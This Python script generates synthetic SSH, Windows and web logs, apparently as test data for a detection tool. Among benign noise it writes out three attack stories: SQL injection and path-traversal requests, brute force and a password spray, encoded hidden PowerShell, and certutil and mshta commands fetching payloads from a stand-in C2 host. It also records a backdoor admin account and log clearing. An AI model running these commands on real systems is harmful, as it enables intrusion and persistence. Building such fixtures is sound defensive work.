"""Deterministic sample log generator: benign noise plus three attack stories.

Attacker addresses use RFC 5737 documentation ranges, so nothing here points at real hosts.

  1. 203.0.113.50   web recon + SQLi + traversal, then SSH brute force that succeeds
  2. 198.51.100.77  password spray against an RDP server, then hands-on-keyboard post-exploitation
  3. 192.0.2.200    a lone sqlmap probe (should stay a small, low-priority incident)
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

MON = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
DAY = datetime(2026, 11, 17, tzinfo=timezone.utc)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"


def generate(out_dir: str | Path = "samples", seed: int = 7) -> dict[str, Path]:
    rnd = random.Random(seed)
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    ssh: list = []
    win: list = []
    web: list = []

    def at(h, m=0, s=0):
        return DAY.replace(hour=h, minute=m, second=s)

    def sshl(ts, msg, host="web01"):
        ssh.append((ts, f"{MON[ts.month - 1]} {ts.day:>2} {ts:%H:%M:%S} {host} sshd[{rnd.randint(1000, 9999)}]: {msg}"))

    def winl(ts, eid, comp, **data):
        win.append((ts, json.dumps({"TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"), "EventID": eid,
                                    "Computer": comp, "EventData": data})))

    def webl(ts, ip, url, status, ua=UA, method="GET"):
        web.append((ts, f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {url} HTTP/1.1" {status} '
                        f'{rnd.randint(200, 9000)} "-" "{ua}"'))

    # ---------------------------------------------------------------- benign noise
    for _ in range(40):
        ts = at(7) + timedelta(seconds=rnd.randint(0, 12 * 3600))
        sshl(ts, f"Accepted publickey for {rnd.choice(['alice', 'bob', 'deploy'])} from "
                 f"10.0.1.{rnd.randint(10, 60)} port {rnd.randint(30000, 60000)} ssh2")
    for ts in (at(8, 30), at(11, 5), at(15, 40)):
        sshl(ts, "Failed password for alice from 10.0.1.23 port 40122 ssh2")

    users = ["alice", "bob", "carol", "dave", "erin", "frank"]
    for _ in range(60):
        ts = at(7) + timedelta(seconds=rnd.randint(0, 12 * 3600))
        comp = rnd.choice([f"WS-{n:03d}" for n in range(1, 11)] + ["RDS01"])
        winl(ts, 4624, comp, TargetUserName=rnd.choice(users), IpAddress=f"10.0.2.{rnd.randint(10, 90)}",
             LogonType=rnd.choice(["2", "3", "10"]))
    for ts in (at(9, 12), at(13, 40), at(16, 2)):
        winl(ts, 4625, "WS-004", TargetUserName="erin", IpAddress="10.0.2.44", LogonType="2")
    benign_proc = [
        (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer"),
        (r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs"),
        (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         r"powershell.exe -File C:\scripts\backup.ps1"),
        (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "OUTLOOK.EXE"),
    ]
    for _ in range(25):
        ts = at(7) + timedelta(seconds=rnd.randint(0, 12 * 3600))
        proc, cmd = rnd.choice(benign_proc)
        winl(ts, 4688, f"WS-{rnd.randint(1, 10):03d}", SubjectUserName=rnd.choice(users), NewProcessName=proc,
             CommandLine=cmd, ParentProcessName=r"C:\Windows\explorer.exe")

    pages = ["/", "/index.html", "/about", "/contact", "/products", "/static/app.js", "/static/site.css"]
    for _ in range(300):
        ts = at(0) + timedelta(seconds=rnd.randint(0, 23 * 3600))
        url = rnd.choice(pages) if rnd.random() < 0.8 else f"/products?id={rnd.randint(1, 99)}"
        webl(ts, f"192.0.2.{rnd.randint(1, 20)}", url, rnd.choices(["200", "304", "404"], [88, 8, 4])[0])

    # ------------------------------------------- story 1: recon -> SQLi -> SSH brute force
    atk = "203.0.113.50"
    paths = ["/admin", "/login.php", "/wp-login.php", "/phpmyadmin", "/.env", "/backup.zip", "/config.php",
             "/.git/config", "/server-status", "/test", "/old", "/db.sql", "/administrator", "/cgi-bin/test.cgi"]
    ts = at(8, 41)
    for i in range(45):
        ts += timedelta(milliseconds=600)
        webl(ts, atk, paths[i % len(paths)] + ("" if i < len(paths) else f"?{i}"), "404", ua="Nikto/2.1.6")
    ts = at(8, 43)
    webl(ts, atk, "/products?id=1'%20OR%20'1'='1", "200", ua="Mozilla/5.0 (compatible)")
    webl(ts + timedelta(seconds=9), atk, "/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users", "500",
         ua="Mozilla/5.0 (compatible)")
    webl(ts + timedelta(seconds=21), atk, "/download?file=../../../../etc/passwd", "400", ua="Mozilla/5.0 (compatible)")
    ts = at(9, 14)
    names = ["root", "admin", "ubuntu", "deploy", "test"]
    for i in range(60):
        ts += timedelta(seconds=3)
        user = names[i % len(names)]
        invalid = "invalid user " if user in ("admin", "ubuntu", "test") else ""
        sshl(ts, f"Failed password for {invalid}{user} from {atk} port {rnd.randint(30000, 60000)} ssh2")
    sshl(at(9, 18, 20), f"Accepted password for deploy from {atk} port 51122 ssh2")

    # ------------------------- story 2: password spray -> RDP login -> post-exploitation
    spray = "198.51.100.77"
    targets = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "svc_backup"]
    ts = at(10, 2)
    for rnd_no in (1, 2):
        for user in targets:
            ts += timedelta(seconds=22)
            if rnd_no == 2 and user == "svc_backup":
                winl(ts, 4624, "RDS01", TargetUserName=user, IpAddress=spray, LogonType="10")
            else:
                winl(ts, 4625, "RDS01", TargetUserName=user, IpAddress=spray, LogonType="10")
        ts += timedelta(seconds=40)
    actor = dict(SubjectUserName="svc_backup")
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    winl(at(10, 21, 5), 4688, "RDS01", NewProcessName=ps, ParentProcessName=r"C:\Windows\System32\cmd.exe",
         CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", **actor)
    winl(at(10, 21, 40), 4688, "RDS01", NewProcessName=r"C:\Windows\System32\certutil.exe",
         ParentProcessName=ps, CommandLine=r"certutil.exe -urlcache -split -f http://c2.example.net/p.bin "
                                           r"C:\Users\Public\p.exe", **actor)
    winl(at(10, 22, 10), 4688, "RDS01", NewProcessName=r"C:\Windows\System32\mshta.exe",
         ParentProcessName=ps, CommandLine="mshta.exe http://c2.example.net/a.hta", **actor)
    winl(at(10, 23, 0), 4720, "RDS01", TargetUserName="backdoor", **actor)
    winl(at(10, 23, 15), 4732, "RDS01", TargetUserName="Administrators", MemberName="backdoor", **actor)
    winl(at(10, 24, 0), 7045, "RDS01", ServiceName="WinUpdateSvc", ImagePath=r"C:\Users\Public\p.exe", **actor)
    winl(at(10, 31, 0), 1102, "RDS01", **actor)

    # --------------------------------------------------------- story 3: lone scanner
    for i, url in enumerate(["/", "/products?id=1", "/products?id=2"]):
        webl(at(13, 20, i * 2), "192.0.2.200", url, "200", ua="sqlmap/1.7.11#stable (https://sqlmap.org)")

    paths_out = {"ssh": out / "auth.log", "windows": out / "windows_security.jsonl", "web": out / "access.log"}
    for key, rows in (("ssh", ssh), ("windows", win), ("web", web)):
        rows.sort(key=lambda r: r[0])
        paths_out[key].write_text("\n".join(r[1] for r in rows) + "\n", encoding="utf-8")
    return paths_out
